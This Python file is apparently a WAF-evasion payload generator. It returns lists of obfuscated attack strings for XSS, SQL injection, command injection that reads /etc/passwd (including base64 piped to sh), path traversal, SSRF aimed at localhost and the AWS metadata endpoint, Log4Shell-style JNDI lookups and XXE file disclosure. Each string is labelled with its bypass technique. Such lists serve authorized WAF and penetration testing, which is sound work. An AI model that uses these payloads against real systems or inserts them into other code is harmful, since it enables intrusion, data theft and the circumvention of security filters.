"""Advanced WAF evasion engine — generates mutated payloads designed to bypass WAF rules.

Uses multiple evasion techniques:
1. Encoding chains (double/triple encoding)
2. Case randomization
3. Comment insertion
4. Null byte injection
5. Unicode normalization tricks
6. Tag fragmentation
7. Protocol-level tricks
8. Polyglot payloads
"""

from __future__ import annotations

from urllib.parse import quote


def generate_evasion_payloads() -> list[dict[str, str]]:
    """Generate advanced evasion payloads across all attack categories.

    Returns list of dicts with: payload, category, technique, description
    """
    payloads: list[dict[str, str]] = []

    # ═══ XSS EVASION ═══
    xss = [
        # Case mixing
        ("<ScRiPt>alert(1)</sCrIpT>", "case_mixing", "Mixed case to evade case-sensitive regex"),
        ("<SCRIPT>alert(1)</SCRIPT>", "uppercase", "All uppercase tags"),
        # Tag fragmentation
        ("<scr<script>ipt>alert(1)</scr</script>ipt>", "tag_fragment", "Nested tag fragments"),
        # Event handlers without script tag
        ("<img src=x onerror=alert(1)>", "event_handler", "IMG onerror without script tag"),
        ("<svg onload=alert(1)>", "svg_onload", "SVG onload event"),
        ("<body onload=alert(1)>", "body_onload", "Body onload event"),
        ("<input onfocus=alert(1) autofocus>", "autofocus", "Input autofocus trick"),
        ("<details open ontoggle=alert(1)>", "details_ontoggle", "Details ontoggle HTML5"),
        ("<marquee onstart=alert(1)>", "marquee", "Marquee onstart event"),
        # Encoding tricks
        ("<script>alert&#40;1&#41;</script>", "html_entity_parens", "HTML entity encoded parentheses"),
        ("<script>alert\u00281\u0029</script>", "unicode_parens", "Unicode encoded parentheses"),
        ("javas\tcript:alert(1)", "tab_break", "Tab character breaking keyword"),
        ("java\x00script:alert(1)", "null_byte", "Null byte in keyword"),
        # Template literals
        ("<script>alert`1`</script>", "template_literal", "Template literal instead of parens"),
        # Constructor trick
        ("[].constructor.constructor('alert(1)')()", "constructor", "Constructor chain execution"),
        # SVG variations
        ("<svg><script>alert&#40;1&#41;</script></svg>", "svg_script", "Script inside SVG context"),
        # Double encoding
        ("%253Cscript%253Ealert(1)%253C/script%253E", "double_url_encode", "Double URL encoding"),
        # JavaScript protocol variations
        ("javascript:/**/alert(1)", "js_comment", "JS comment in protocol handler"),
        # DOM clobbering
        ("<form id=x><input name=innerHTML></form>", "dom_clobber", "DOM clobbering attack"),
        # Mutation XSS
        ("<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">", "mutation_xss", "Mutation XSS via noscript"),
    ]
    for payload, tech, desc in xss:
        payloads.append({"payload": payload, "category": "XSS", "technique": tech, "description": desc})

    # ═══ SQL INJECTION EVASION ═══
    sqli = [
        # Comment tricks
        ("' OR/**/1=1--", "inline_comment", "Inline comment to break tokenization"),
        ("' /*!50000OR*/ 1=1--", "mysql_version_comment", "MySQL version-specific comment"),
        ("' OR 1=1--\t", "trailing_tab", "Trailing tab after comment"),
        # Case mixing
        ("' oR 1=1--", "case_mix", "Mixed case OR"),
        ("' UnIoN SeLeCt 1,2,3--", "union_case_mix", "Mixed case UNION SELECT"),
        # Encoding
        ("' %4F%52 1=1--", "hex_keywords", "Hex-encoded OR keyword"),
        ("' OR 0x313d31--", "hex_comparison", "Hex-encoded comparison value"),
        # Whitespace alternatives
        ("' OR\t1=1--", "tab_whitespace", "Tab instead of space"),
        ("' OR\n1=1--", "newline_whitespace", "Newline instead of space"),
        ("' OR\r\n1=1--", "crlf_whitespace", "CRLF instead of space"),
        # Null byte
        ("' OR%001=1--", "null_byte", "Null byte injection"),
        # Double encoding
        ("%2527%2520OR%25201%253D1--", "double_encode", "Double URL encoding"),
        # String concatenation
        ("' OR 'a'='a", "string_compare", "String comparison bypass"),
        ("' OR 1=1 OR ''='", "double_or", "Double OR condition"),
        # LIKE bypass
        ("' OR username LIKE '%admin%'--", "like_wildcard", "LIKE wildcard injection"),
        # Time-based blind
        ("' OR IF(1=1,SLEEP(0),0)--", "time_blind", "Time-based blind with IF"),
        ("'; WAITFOR DELAY '0:0:0'--", "mssql_delay", "MSSQL WAITFOR with zero delay"),
        # Stacked queries
        ("'; SELECT 1--", "stacked", "Stacked query attempt"),
    ]
    for payload, tech, desc in sqli:
        payloads.append({"payload": payload, "category": "SQLi", "technique": tech, "description": desc})

    # ═══ RCE / COMMAND INJECTION EVASION ═══
    rce = [
        # Concatenation
        ("cat$IFS/etc/passwd", "ifs_variable", "$IFS as space replacement"),
        ("c'a't /etc/passwd", "quote_break", "Single quotes breaking command"),
        ('c"a"t /etc/passwd', "dquote_break", "Double quotes breaking command"),
        ("ca\\t /etc/passwd", "backslash", "Backslash escape in command"),
        # Variable tricks
        ("${PATH:0:1}etc${PATH:0:1}passwd", "var_slice", "Path variable slicing"),
        # Wildcard
        ("cat /etc/pass??", "wildcard", "Wildcard characters"),
        ("cat /etc/p*d", "glob", "Glob pattern"),
        # Backtick alternative
        ("$(cat /etc/passwd)", "command_sub", "Command substitution $()"),
        # Hex encoding
        ("$(printf '\\x63\\x61\\x74 \\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64')", "hex_printf", "Hex-encoded via printf"),
        # Base64 encoding
        ("echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh", "base64_decode", "Base64 encoded command"),
        # Newline injection
        ("id\nwhoami", "newline_cmd", "Newline command separator"),
        # Environment variable
        ("${HOME:0:1}${HOSTNAME:0:0}", "env_var", "Environment variable extraction"),
        # Log4Shell style
        ("${jndi:ldap://127.0.0.1/test}", "jndi", "JNDI lookup (Log4Shell style)"),
        ("${${lower:j}ndi:${lower:l}dap://127.0.0.1/x}", "jndi_nested", "Nested JNDI with lower()"),
    ]
    for payload, tech, desc in rce:
        payloads.append({"payload": payload, "category": "RCE", "technique": tech, "description": desc})

    # ═══ PATH TRAVERSAL EVASION ═══
    lfi = [
        # Encoding
        ("..%2f..%2f..%2fetc%2fpasswd", "url_encode_slash", "URL encoded forward slashes"),
        ("..%252f..%252f..%252fetc%252fpasswd", "double_encode_slash", "Double encoded slashes"),
        ("..%c0%af..%c0%af..%c0%afetc/passwd", "overlong_utf8", "Overlong UTF-8 encoding"),
        # Null byte
        ("../../../etc/passwd%00.jpg", "null_byte_ext", "Null byte with fake extension"),
        ("../../../etc/passwd\x00.png", "null_byte_raw", "Raw null byte with extension"),
        # Unicode normalization
        ("..\\..\\..\\etc\\passwd", "backslash_path", "Backslash path separators"),
        ("....//....//....//etc/passwd", "double_dot_slash", "Double dot-slash"),
        ("..;/..;/..;/etc/passwd", "semicolon_path", "Semicolon in path (Tomcat)"),
        # Filter bypass
        ("....//....//etc/passwd", "stripped_dots", "Extra dots for filter stripping"),
        ("/etc/passwd", "direct_absolute", "Direct absolute path"),
        ("php://filter/convert.base64-encode/resource=/etc/passwd", "php_filter", "PHP filter wrapper"),
    ]
    for payload, tech, desc in lfi:
        payloads.append({"payload": payload, "category": "LFI", "technique": tech, "description": desc})

    # ═══ SSRF ═══
    ssrf = [
        ("http://127.0.0.1", "localhost_ip", "Direct localhost IP"),
        ("http://0x7f000001", "hex_ip", "Hexadecimal IP encoding"),
        ("http://2130706433", "decimal_ip", "Decimal IP encoding"),
        ("http://0177.0.0.1", "octal_ip", "Octal IP encoding"),
        ("http://127.1", "short_ip", "Shortened IP notation"),
        ("http://[::1]", "ipv6_localhost", "IPv6 localhost"),
        ("http://localtest.me", "dns_rebind", "DNS rebinding domain"),
        ("http://169.254.169.254/latest/meta-data/", "aws_metadata", "AWS metadata endpoint"),
    ]
    for payload, tech, desc in ssrf:
        payloads.append({"payload": payload, "category": "SSRF", "technique": tech, "description": desc})

    # ═══ XXE ═══
    xxe = [
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
         "classic_xxe", "Classic XXE with file:// protocol"),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1">]><foo>&xxe;</foo>',
         "ssrf_xxe", "XXE with SSRF via http://"),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>',
         "parameter_entity", "Parameter entity XXE"),
    ]
    for payload, tech, desc in xxe:
        payloads.append({"payload": payload, "category": "XXE", "technique": tech, "description": desc})

    return payloads
